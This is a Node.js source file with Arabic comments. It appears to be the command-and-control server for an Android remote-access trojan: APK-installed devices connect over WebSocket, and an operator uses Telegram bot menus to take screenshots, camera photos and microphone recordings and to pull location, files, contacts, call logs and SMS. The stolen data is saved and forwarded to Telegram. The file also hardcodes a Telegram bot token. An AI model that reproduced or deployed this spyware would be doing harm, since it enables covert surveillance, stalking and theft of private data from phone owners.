const express = require('express');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');
const crypto = require('crypto');

// الإعدادات الأساسية
const TELEGRAM_TOKEN = "8422146946:AAF3MXu0dfIh1t0KkX_TWLqvKN7YV4Vulw8";
const AUTHORIZED_USERS = [7604667042];
const SERVER_PORT = process.env.PORT || 3000;
const SERVER_HOST = "0.0.0.0";

// إنشاء التطبيقات
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// تخزين البيانات
const connectedDevices = new Map();
const userSessions = new Map();
const deviceCommands = new Map();

// وسائط Express
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// مسارات الويب
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/api/devices', (req, res) => {
    res.json({
        total: connectedDevices.size,
        devices: Array.from(connectedDevices.entries()).map(([id, device]) => ({
            id,
            ip: device.ip,
            connectedAt: device.connectedAt,
            info: device.info
        }))
    });
});

app.get('/api/status', (req, res) => {
    res.json({
        server: 'running',
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        devices: connectedDevices.size
    });
});

// اتصال WebSocket من APK
wss.on('connection', (ws, req) => {
    const deviceId = crypto.randomBytes(8).toString('hex');
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    console.log(`📱 APK connected: ${deviceId} from ${clientIp}`);
    
    connectedDevices.set(deviceId, {
        ws: ws,
        ip: clientIp,
        connectedAt: new Date(),
        info: {},
        lastPing: Date.now()
    });

    // إرسال رسالة ترحيب
    ws.send(JSON.stringify({
        type: 'welcome',
        deviceId: deviceId,
        message: 'Connected successfully',
        timestamp: Date.now(),
        config: {
            allowScreenshots: true,
            allowCamera: true,
            allowLocation: true,
            allowFiles: true,
            allowMicrophone: true,
            allowCalls: true,
            allowContacts: true,
            allowSms: true
        }
    }));

    // إرسال إشعار للتلجرام
    sendToTelegram(`📱 New device connected\nID: ${deviceId}\nIP: ${clientIp}\nTime: ${new Date().toLocaleString()}`);

    // استقبال البيانات من APK
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            handleDeviceMessage(deviceId, message);
        } catch (error) {
            console.error('Error parsing device message:', error);
        }
    });

    ws.on('close', () => {
        console.log(`Device disconnected: ${deviceId}`);
        connectedDevices.delete(deviceId);
        sendToTelegram(`❌ Device disconnected: ${deviceId}`);
    });

    ws.on('error', (error) => {
        console.error(`WebSocket error for ${deviceId}:`, error);
    });

    // ping/pong للتحقق من الاتصال
    const pingInterval = setInterval(() => {
        if (ws.readyState === ws.OPEN) {
            ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
        }
    }, 30000);

    ws.on('close', () => {
        clearInterval(pingInterval);
    });
});

// معالجة رسائل الأجهزة
function handleDeviceMessage(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    if (!device) return;

    console.log(`Message from ${deviceId}:`, message.type);

    switch (message.type) {
        case 'pong':
            device.lastPing = Date.now();
            break;

        case 'device_info':
            device.info = message.data;
            sendToTelegram(
                `📊 Device Info - ${deviceId}\n` +
                `Model: ${message.data.model || 'Unknown'}\n` +
                `Android: ${message.data.androidVersion || 'Unknown'}\n` +
                `Battery: ${message.data.battery || 'Unknown'}%\n` +
                `Storage: ${message.data.storage || 'Unknown'}\n` +
                `Root: ${message.data.isRooted ? 'Yes' : 'No'}`
            );
            break;

        case 'location':
            sendToTelegram(
                `📍 Location - ${deviceId}\n` +
                `Latitude: ${message.data.latitude}\n` +
                `Longitude: ${message.data.longitude}\n` +
                `Accuracy: ${message.data.accuracy || 'N/A'}m\n` +
                `Time: ${new Date(message.timestamp).toLocaleString()}`
            );
            break;

        case 'screenshot_result':
            if (message.success && message.imageData) {
                const screenshotPath = `screenshots/${deviceId}_${Date.now()}.jpg`;
                fs.writeFileSync(screenshotPath, Buffer.from(message.imageData, 'base64'));
                sendToTelegram(`✅ Screenshot captured from ${deviceId}`);
            } else {
                sendToTelegram(`❌ Screenshot failed from ${deviceId}`);
            }
            break;

        case 'camera_result':
            if (message.success && message.imageData) {
                const cameraPath = `camera/${deviceId}_${Date.now()}.jpg`;
                fs.writeFileSync(cameraPath, Buffer.from(message.imageData, 'base64'));
                sendToTelegram(`✅ Camera photo captured from ${deviceId}`);
            }
            break;

        case 'file_list':
            const files = message.data.files || [];
            sendToTelegram(
                `📁 Files - ${deviceId}\n` +
                files.slice(0, 15).map(f => `📄 ${f}`).join('\n') +
                (files.length > 15 ? `\n... and ${files.length - 15} more files` : '')
            );
            break;

        case 'contacts_list':
            const contacts = message.data.contacts || [];
            sendToTelegram(
                `👥 Contacts - ${deviceId}\n` +
                contacts.slice(0, 10).map(c => `👤 ${c.name}: ${c.number}`).join('\n') +
                (contacts.length > 10 ? `\n... and ${contacts.length - 10} more contacts` : '')
            );
            break;

        case 'calls_list':
            const calls = message.data.calls || [];
            sendToTelegram(
                `📞 Call Logs - ${deviceId}\n` +
                calls.slice(0, 10).map(c => `📞 ${c.number} (${c.type}) - ${c.duration}`).join('\n')
            );
            break;

        case 'sms_list':
            const sms = message.data.sms || [];
            sendToTelegram(
                `💬 SMS - ${deviceId}\n` +
                sms.slice(0, 10).map(s => `💬 ${s.number}: ${s.message.substring(0, 50)}`).join('\n')
            );
            break;

        case 'microphone_result':
            if (message.success && message.audioData) {
                const audioPath = `audio/${deviceId}_${Date.now()}.wav`;
                fs.writeFileSync(audioPath, Buffer.from(message.audioData, 'base64'));
                sendToTelegram(`🎤 Audio recorded from ${deviceId}`);
            }
            break;

        case 'command_result':
            if (message.commandId && deviceCommands.has(message.commandId)) {
                const { resolve } = deviceCommands.get(message.commandId);
                resolve(message);
                deviceCommands.delete(message.commandId);
            }
            break;

        case 'error':
            sendToTelegram(`❌ Error from ${deviceId}: ${message.error}`);
            break;
    }
}

// أوامر التلجرام
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!AUTHORIZED_USERS.includes(chatId)) {
        return bot.sendMessage(chatId, '❌ Unauthorized access');
    }

    const keyboard = {
        reply_markup: {
            keyboard: [
                ['📊 Server Status', '📋 Connected Devices'],
                ['🖼️ Take Screenshot', '📍 Get Location'],
                ['📁 List Files', '📷 Take Camera Photo'],
                ['👥 Get Contacts', '📞 Get Call Logs'],
                ['💬 Get SMS', '🎤 Record Audio'],
                ['🔒 Lock Device', '🔄 Reboot Device'],
                ['📱 Device Info', '⚙️ Settings']
            ],
            resize_keyboard: true
        }
    };

    bot.sendMessage(chatId, 
        `🎮 **Remote Control System**\n\n` +
        `Welcome to your remote control dashboard.\n` +
        `Use the buttons below to control connected devices.\n\n` +
        `Connected devices: ${connectedDevices.size}`,
        { parse_mode: 'Markdown', ...keyboard }
    );
});

// حالة السيرفر
bot.onText(/📊 Server Status/, (msg) => {
    const chatId = msg.chat.id;
    if (!AUTHORIZED_USERS.includes(chatId)) return;

    bot.sendMessage(chatId,
        `📊 **Server Status**\n` +
        `🖥️ Server: ✅ Running\n` +
        `📱 Devices: ${connectedDevices.size} connected\n` +
        `⏰ Uptime: ${formatUptime(process.uptime())}\n` +
        `💾 Memory: ${Math.round(process.memoryUsage().rss / 1024 / 1024)}MB\n` +
        `🔐 Users: ${AUTHORIZED_USERS.length} authorized`,
        { parse_mode: 'Markdown' }
    );
});

// قائمة الأجهزة
bot.onText(/📋 Connected Devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!AUTHORIZED_USERS.includes(chatId)) return;

    if (connectedDevices.size === 0) {
        return bot.sendMessage(chatId, '❌ No devices connected');
    }

    const devicesKeyboard = {
        reply_markup: {
            keyboard: [
                ...Array.from(connectedDevices.keys()).map(deviceId => [`🎯 ${deviceId}`]),
                ['↩️ Back to Main']
            ],
            resize_keyboard: true
        }
    };

    let devicesList = '📱 **Connected Devices:**\n\n';
    connectedDevices.forEach((device, deviceId) => {
        devicesList += `🔹 ${deviceId}\n`;
        devicesList += `   📍 IP: ${device.ip}\n`;
        devicesList += `   ⏰ Connected: ${formatTimeDiff(device.connectedAt)}\n`;
        if (device.info.model) {
            devicesList += `   📱 ${device.info.model}\n`;
        }
        devicesList += `\n`;
    });

    userSessions.set(chatId, { step: 'select_device' });

    bot.sendMessage(chatId, devicesList, { 
        parse_mode: 'Markdown',
        ...devicesKeyboard 
    });
});

// معالجة اختيار الجهاز
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (!AUTHORIZED_USERS.includes(chatId)) return;

    const text = msg.text;
    const session = userSessions.get(chatId) || {};

    // اختيار جهاز
    if (session.step === 'select_device' && text.startsWith('🎯 ')) {
        const deviceId = text.replace('🎯 ', '');
        if (connectedDevices.has(deviceId)) {
            userSessions.set(chatId, { 
                step: 'device_selected', 
                selectedDevice: deviceId 
            });

            const controlKeyboard = {
                reply_markup: {
                    keyboard: [
                        ['🖼️ Take Screenshot', '📍 Get Location'],
                        ['📁 List Files', '📷 Take Camera Photo'],
                        ['👥 Get Contacts', '📞 Get Call Logs'],
                        ['💬 Get SMS', '🎤 Record Audio'],
                        ['🔒 Lock Device', '🔄 Reboot Device'],
                        ['📱 Device Info', '↩️ Back to Devices']
                    ],
                    resize_keyboard: true
                }
            };

            bot.sendMessage(chatId, 
                `🎯 **Selected Device:** ${deviceId}\n\n` +
                `Choose an action to perform:`,
                { parse_mode: 'Markdown', ...controlKeyboard }
            );
        }
    }

    // الرجوع للقائمة الرئيسية
    if (text === '↩️ Back to Main') {
        userSessions.set(chatId, {});
        const mainKeyboard = {
            reply_markup: {
                keyboard: [
                    ['📊 Server Status', '📋 Connected Devices'],
                    ['🖼️ Take Screenshot', '📍 Get Location'],
                    ['📁 List Files', '📷 Take Camera Photo'],
                    ['👥 Get Contacts', '📞 Get Call Logs'],
                    ['💬 Get SMS', '🎤 Record Audio'],
                    ['🔒 Lock Device', '🔄 Reboot Device'],
                    ['📱 Device Info', '⚙️ Settings']
                ],
                resize_keyboard: true
            }
        };
        bot.sendMessage(chatId, '🏠 Main Menu', mainKeyboard);
    }

    // الرجوع لقائمة الأجهزة
    if (text === '↩️ Back to Devices') {
        userSessions.set(chatId, { step: 'select_device' });
        
        const devicesKeyboard = {
            reply_markup: {
                keyboard: [
                    ...Array.from(connectedDevices.keys()).map(deviceId => [`🎯 ${deviceId}`]),
                    ['↩️ Back to Main']
                ],
                resize_keyboard: true
            }
        };

        bot.sendMessage(chatId, '📱 Select a device:', devicesKeyboard);
    }

    // الأوامر عندما يكون جهاز محدد
    if (session.step === 'device_selected' && session.selectedDevice) {
        const deviceId = session.selectedDevice;
        
        if (text === '🖼️ Take Screenshot') {
            sendToDevice(deviceId, { type: 'take_screenshot', quality: 85 });
            bot.sendMessage(chatId, `📸 Taking screenshot from ${deviceId}...`);
        }
        else if (text === '📍 Get Location') {
            sendToDevice(deviceId, { type: 'get_location' });
            bot.sendMessage(chatId, `📍 Getting location from ${deviceId}...`);
        }
        else if (text === '📁 List Files') {
            sendToDevice(deviceId, { type: 'list_files', path: '/sdcard/' });
            bot.sendMessage(chatId, `📁 Listing files from ${deviceId}...`);
        }
        else if (text === '📷 Take Camera Photo') {
            sendToDevice(deviceId, { type: 'take_camera_photo', camera: 'back' });
            bot.sendMessage(chatId, `📷 Taking camera photo from ${deviceId}...`);
        }
        else if (text === '👥 Get Contacts') {
            sendToDevice(deviceId, { type: 'get_contacts' });
            bot.sendMessage(chatId, `👥 Getting contacts from ${deviceId}...`);
        }
        else if (text === '📞 Get Call Logs') {
            sendToDevice(deviceId, { type: 'get_call_logs', limit: 50 });
            bot.sendMessage(chatId, `📞 Getting call logs from ${deviceId}...`);
        }
        else if (text === '💬 Get SMS') {
            sendToDevice(deviceId, { type: 'get_sms', limit: 50 });
            bot.sendMessage(chatId, `💬 Getting SMS from ${deviceId}...`);
        }
        else if (text === '🎤 Record Audio') {
            sendToDevice(deviceId, { type: 'record_audio', duration: 30000 });
            bot.sendMessage(chatId, `🎤 Recording audio from ${deviceId}...`);
        }
        else if (text === '🔒 Lock Device') {
            sendToDevice(deviceId, { type: 'lock_device' });
            bot.sendMessage(chatId, `🔒 Locking device ${deviceId}...`);
        }
        else if (text === '🔄 Reboot Device') {
            sendToDevice(deviceId, { type: 'reboot_device' });
            bot.sendMessage(chatId, `🔄 Rebooting device ${deviceId}...`);
        }
        else if (text === '📱 Device Info') {
            sendToDevice(deviceId, { type: 'get_device_info' });
            bot.sendMessage(chatId, `📱 Getting device info from ${deviceId}...`);
        }
    }
});

// إرسال أمر لجهاز
function sendToDevice(deviceId, command) {
    const device = connectedDevices.get(deviceId);
    if (!device || !device.ws || device.ws.readyState !== WebSocket.OPEN) {
        sendToTelegram(`❌ Device ${deviceId} is not connected`);
        return false;
    }

    try {
        const commandId = crypto.randomBytes(4).toString('hex');
        command.commandId = commandId;
        
        device.ws.send(JSON.stringify(command));
        console.log(`Command sent to ${deviceId}:`, command.type);
        return true;
    } catch (error) {
        console.error(`Failed to send command to ${deviceId}:`, error);
        sendToTelegram(`❌ Failed to send command to ${deviceId}`);
        return false;
    }
}

// إرسال رسالة للتلجرام
function sendToTelegram(message) {
    AUTHORIZED_USERS.forEach(userId => {
        bot.sendMessage(userId, message, { parse_mode: 'Markdown' }).catch(err => {
            console.error('Failed to send Telegram message:', err);
        });
    });
}

// وظائف مساعدة
function formatUptime(seconds) {
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    return `${days}d ${hours}h ${minutes}m`;
}

function formatTimeDiff(date) {
    const diff = Date.now() - date.getTime();
    const minutes = Math.floor(diff / 60000);
    if (minutes < 60) return `${minutes} minutes ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours} hours ago`;
    const days = Math.floor(hours / 24);
    return `${days} days ago`;
}

// التأكد من وجود المجلدات
['screenshots', 'camera', 'audio'].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// بدء السيرفر
server.listen(SERVER_PORT, SERVER_HOST, () => {
    console.log(`🚀 Server running on: http://${SERVER_HOST}:${SERVER_PORT}`);
    console.log(`🤖 Telegram bot ready`);
    console.log(`📱 Ready for APK connections`);
    console.log(`🔗 WebSocket: ws://${SERVER_HOST}:${SERVER_PORT}`);
});

// معالجة الأخطاء
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection:', reason);
});
